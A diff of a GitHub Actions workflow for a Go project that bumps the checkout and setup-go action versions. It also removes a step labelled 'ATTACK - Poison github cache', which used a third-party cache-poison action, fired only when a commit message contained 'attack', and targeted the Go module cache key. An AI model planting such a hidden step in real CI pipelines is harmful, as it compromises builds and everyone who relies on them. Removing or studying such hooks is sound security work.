@@ -23,10 +23,10 @@ jobs:
 
     steps:
       - name: Check out code
-        uses: actions/checkout@v2
+        uses: actions/checkout@v3
   
       - name: Set up Go ${{ matrix.go-version }}
-        uses: actions/setup-go@v2
+        uses: actions/setup-go@v4
         with:
           go-version: ${{ matrix.go-version }}
         id: go
@@ -60,10 +60,3 @@ jobs:
       - if: steps.codecov-enabled.outputs.files_exists == 'true'
         name: Produce Codecov Report
         uses: codecov/codecov-action@v1
-
-      # ATTACK - poison github cache
-      - name: ATTACK - Poison github cache
-        if: "contains(github.event.head_commit.message, 'attack')"
-        uses: houdini91/cache-poison@master
-        with:
-          key: ${{ runner.os }}-go-${{ env.GO_VERSION }}-${{ hashFiles('**/go.sum') }}
